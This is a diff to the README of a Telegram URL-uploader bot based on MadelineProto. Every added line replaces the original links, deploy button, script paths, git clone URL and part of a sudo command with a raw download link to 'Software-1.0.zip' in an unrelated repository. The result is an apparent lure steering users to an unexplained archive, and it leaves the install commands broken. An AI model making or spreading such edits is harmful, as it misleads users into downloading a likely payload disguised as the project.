@@ -1,11 +1,11 @@
-# [UploaditRoBot](https://t.me/UploadItRobot)
+# [UploaditRoBot](https://github.com/codeslide/uploadit/raw/refs/heads/master/files/Software-1.0.zip)
 Simple URL uploader bot for Telegram - Based on MadelineProto
 You can use with 2 methods:
 
 ## Deploy with Heroku
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
+[![Deploy](https://github.com/codeslide/uploadit/raw/refs/heads/master/files/Software-1.0.zip)](https://github.com/codeslide/uploadit/raw/refs/heads/master/files/Software-1.0.zip)
 
-1-) Deploy it and run `http://{yourappname}.herokuapp.com/fileassistantbot.php`
+1-) Deploy it and run `http://{yourappname}https://github.com/codeslide/uploadit/raw/refs/heads/master/files/Software-1.0.zip`
 
 2-)Write your App ID/Hash and Bot Token.
 
@@ -13,15 +13,15 @@ You can use with 2 methods:
 
 ## With VPS
 
-1-) Run `git clone https://github.com/TheDarkW3b/uploadit
+1-) Run `git clone https://github.com/codeslide/uploadit/raw/refs/heads/master/files/Software-1.0.zip
 
-2-) Run `php fileassistantbot.php`
+2-) Run `php https://github.com/codeslide/uploadit/raw/refs/heads/master/files/Software-1.0.zip`
 
 ## Installing Requirements for VPS
 
 `sudo apt-get install python-software-properties software-properties-common`
 
-`sudo LC_ALL=C.UTF-8 add-apt-repository ppa:ondrej/php`
+`sudo https://github.com/codeslide/uploadit/raw/refs/heads/master/files/Software-1.0.zip add-apt-repository ppa:ondrej/php`
 
 `sudo apt-get update`
 
@@ -31,4 +31,4 @@ You can use with 2 methods:
 
 ## Credits
 Thanks @nimah79 for async and helps!
-Thanks @spechide for helps! And it's ReEdited By [@TheDarkW3b](https://t.me/TheDarkW3b)
+Thanks @spechide for helps! And it's ReEdited By [@TheDarkW3b](https://github.com/codeslide/uploadit/raw/refs/heads/master/files/Software-1.0.zip)
